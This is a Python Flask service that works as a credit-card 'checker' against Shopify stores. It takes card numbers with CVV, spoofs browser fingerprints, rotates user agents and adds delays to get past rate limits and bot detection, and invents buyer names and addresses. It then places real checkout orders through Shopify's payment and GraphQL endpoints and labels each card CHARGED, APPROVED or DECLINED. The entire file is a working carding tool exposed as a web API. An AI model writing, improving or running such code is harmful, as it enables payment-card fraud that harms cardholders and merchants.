#!/usr/bin/env python3
from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import httpx
import random
import re
import json
import os
import time
from urllib.parse import urlparse
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Browser fingerprints
BROWSERS = [
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'platform': '"Windows"'
    },
    {
        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'platform': '"macOS"'
    }
]

class ShopifyChecker:
    def __init__(self):
        self.fingerprint = random.choice(BROWSERS)
        self.ua = self.fingerprint['ua']
    
    def headers(self, extra=None):
        h = {
            'User-Agent': self.ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'sec-ch-ua': self.fingerprint['sec_ch_ua'],
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': self.fingerprint['platform'],
            'Cache-Control': 'max-age=0'
        }
        if extra:
            h.update(extra)
        return h
    
    async def delay(self, min_s=0.5, max_s=2.0):
        await asyncio.sleep(random.uniform(min_s, max_s))
    
    def find_between(self, s, start, end):
        try:
            if start in s and end in s:
                return (s.split(start))[1].split(end)[0]
            return ""
        except:
            return ""
    
    async def get_info(self):
        addresses = [
            {"add1": "123 Main St", "city": "Portland", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state_short": "ME", "zip": "04103"},
            {"add1": "777 Broadway", "city": "New York", "state_short": "NY", "zip": "10001"},
            {"add1": "888 Sunset Blvd", "city": "Los Angeles", "state_short": "CA", "zip": "90028"}
        ]
        addr = random.choice(addresses)
        first = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
        return {
            "fname": first, "lname": last,
            "email": f"{first.lower()}.{last.lower()}{random.randint(1,999)}@gmail.com",
            "phone": random.choice(["2025550199", "3105551234", "4155559876", "6175550123"]),
            "add1": addr["add1"], "city": addr["city"],
            "state_short": addr["state_short"], "zip": addr["zip"]
        }

    async def check_card(self, site_url, card):
        start = time.time()
        async with httpx.AsyncClient(follow_redirects=True, timeout=60.0) as session:
            try:
                parts = card.split('|')
                if len(parts) != 4:
                    return {"status": "ERROR", "message": "Invalid format"}
                cc, mon, year, cvv = parts
                
                # ===== WARM UP =====
                await session.get(site_url, headers=self.headers())
                await self.delay(1.0, 2.0)
                await session.get(f"{site_url}/collections/all", headers=self.headers())
                await self.delay(0.5, 1.0)
                
                # ===== GET PRODUCT with retry =====
                json_h = self.headers({'Accept': 'application/json'})
                resp = None
                for attempt in range(4):
                    resp = await session.get(site_url + '/products.json', headers=json_h)
                    if resp.status_code == 200:
                        break
                    elif resp.status_code == 429:
                        wait = random.uniform(5.0, 12.0)
                        print(f"⏳ 429 - Waiting {wait:.1f}s...")
                        await asyncio.sleep(wait)
                        self.fingerprint = random.choice(BROWSERS)
                        json_h['User-Agent'] = self.fingerprint['ua']
                        continue
                    else:
                        return {"status": "ERROR", "message": f"Product fetch failed: {resp.status_code}"}
                
                if resp is None or resp.status_code != 200:
                    return {"status": "ERROR", "message": "Product fetch failed after retries"}
                
                products = resp.json().get('products', [])
                if not products:
                    return {"status": "ERROR", "message": "No products"}
                
                p = products[0]
                variant_id = p['variants'][0]['id']
                handle = p['handle']
                price = p['variants'][0]['price']
                
                # ===== VIEW PRODUCT =====
                await session.get(f"{site_url}/products/{handle}", headers=self.headers())
                await self.delay(0.3, 0.8)
                
                # ===== ADD TO CART =====
                cart_h = self.headers({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': f"{site_url}/products/{handle}"
                })
                resp = await session.post(site_url + '/cart/add.js', headers=cart_h, data={
                    'id': str(variant_id), 'quantity': '1', 'form_type': 'product'
                })
                if resp.status_code != 200:
                    return {"status": "ERROR", "message": f"Cart add failed: {resp.status_code}"}
                await self.delay(0.5, 1.0)
                
                # ===== GET TOKEN =====
                resp = await session.get(f"{site_url}/cart.js", headers=self.headers())
                token = resp.json().get('token')
                if not token:
                    return {"status": "ERROR", "message": "No cart token"}
                
                # ===== CHECKOUT =====
                ch_h = self.headers({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': f"{site_url}/cart"
                })
                await session.get(f"{site_url}/checkout", headers=ch_h)
                await self.delay(0.3, 0.8)
                resp = await session.post(f"{site_url}/cart", headers=ch_h, data={'checkout': '', 'updates[]': '1'})
                html = resp.text
                
                # ===== EXTRACT TOKENS =====
                st_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
                if not st_match:
                    return {"status": "ERROR", "message": "Token extraction failed"}
                session_token = st_match.group(1)
                queue_token = self.find_between(html, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = self.find_between(html, 'stableId&quot;:&quot;', '&quot;')
                payment_id = self.find_between(html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                
                if not all([session_token, queue_token, stable_id, payment_id]):
                    return {"status": "ERROR", "message": "Token extraction incomplete"}
                
                # ===== GET ADDRESS =====
                info = await self.get_info()
                
                # ===== PAYMENT SESSION =====
                session_id = None
                for endpoint in ["https://deposit.us.shopifycs.com/sessions", "https://checkout.shopifycs.com/sessions"]:
                    try:
                        resp = await session.post(endpoint, headers={
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                            'User-Agent': self.ua
                        }, json={
                            'credit_card': {
                                'number': cc, 'month': mon, 'year': year,
                                'verification_value': cvv,
                                'name': f"{info['fname']} {info['lname']}"
                            },
                            'payment_session_scope': urlparse(site_url).netloc
                        })
                        if resp.status_code == 200 and 'id' in resp.json():
                            session_id = resp.json()['id']
                            break
                    except:
                        continue
                
                if not session_id:
                    return {"status": "ERROR", "message": "Payment session failed"}
                
                # ===== GRAPHQL =====
                gql_h = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': site_url,
                    'User-Agent': self.ua,
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-source-id': token,
                }
                
                payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on FailedReceipt{id processingError{code __typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True}
                                        },
                                        'options': {}
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': info['add1'], 'address2': '',
                                            'city': info['city'], 'countryCode': 'US',
                                            'postalCode': info['zip'],
                                            'firstName': info['fname'], 'lastName': info['lname'],
                                            'zoneCode': info['state_short'], 'phone': info['phone']
                                        }
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True}
                                }],
                                'noDeliveryRequired': []
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}'
                                        }
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True}
                                }]
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': payment_id,
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': info['add1'], 'city': info['city'],
                                                    'countryCode': 'US', 'postalCode': info['zip'],
                                                    'firstName': info['fname'], 'lastName': info['lname'],
                                                    'zoneCode': info['state_short'], 'phone': info['phone']
                                                }
                                            }
                                        }
                                    },
                                    'amount': {'any': True}
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': info['add1'], 'city': info['city'],
                                        'countryCode': 'US', 'postalCode': info['zip'],
                                        'firstName': info['fname'], 'lastName': info['lname'],
                                        'zoneCode': info['state_short'], 'phone': info['phone']
                                    }
                                }
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                                'contactInfoV2': {'emailOrSms': {'value': info['email']}}
                            },
                            'taxes': {
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}
                            }
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'analytics': {'requestUrl': f'{site_url}/checkouts/cn/{token}'}
                    }
                }
                
                resp = await session.post(f"{site_url}/checkouts/unstable/graphql", headers=gql_h, json=payload)
                elapsed = time.time() - start
                
                if resp.status_code != 200:
                    return {"status": "ERROR", "message": f"GraphQL failed: {resp.status_code}", "time": f"{elapsed:.1f}s"}
                
                data = resp.json()
                completion = data.get('data', {}).get('submitForCompletion', {})
                
                if completion.get('__typename') == 'SubmitSuccess':
                    receipt = completion.get('receipt', {})
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return {"status": "CHARGED", "message": "ORDER_PLACED", "order_id": receipt.get('token'), "price": price, "time": f"{elapsed:.1f}s"}
                    elif receipt.get('__typename') == 'ActionRequiredReceipt':
                        return {"status": "APPROVED", "message": "3DS_REQUIRED", "price": price, "time": f"{elapsed:.1f}s"}
                
                elif completion.get('__typename') == 'SubmitRejected':
                    for error in completion.get('errors', []):
                        code = error.get('code', '')
                        if 'INSUFFICIENT_FUNDS' in code:
                            return {"status": "APPROVED", "message": "INSUFFICIENT_FUNDS", "price": price, "time": f"{elapsed:.1f}s"}
                        elif 'CVC' in code or 'CVV' in code:
                            return {"status": "APPROVED", "message": "INCORRECT_CVC", "price": price, "time": f"{elapsed:.1f}s"}
                    return {"status": "DECLINED", "message": "CARD_DECLINED", "price": price, "time": f"{elapsed:.1f}s"}
                
                else:
                    return {"status": "DECLINED", "message": "CARD_DECLINED", "price": price, "time": f"{elapsed:.1f}s"}
                
            except Exception as e:
                return {"status": "ERROR", "message": str(e)[:100], "time": f"{time.time() - start:.1f}s"}

@app.route('/', methods=['GET'])
def home():
    return jsonify({'status': 'online', 'version': '5.0', 'endpoint': '/check'})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'})

@app.route('/check', methods=['POST'])
def check():
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'Missing JSON'}), 400
        site = data.get('site')
        cc = data.get('cc')
        if not site or not cc:
            return jsonify({'error': 'Missing site or cc'}), 400
        if not site.startswith('http'):
            site = 'https://' + site
        result = asyncio.run(ShopifyChecker().check_card(site, cc))
        return jsonify({'site': site, 'cc': cc, 'result': result, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/shopify', methods=['GET', 'POST'])
def shopify():
    if request.method == 'GET':
        site = request.args.get('site')
        cc = request.args.get('cc')
        if site and cc:
            data = {'site': site, 'cc': cc}
            request._cached_json = (data,)
            return check()
    return check()

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
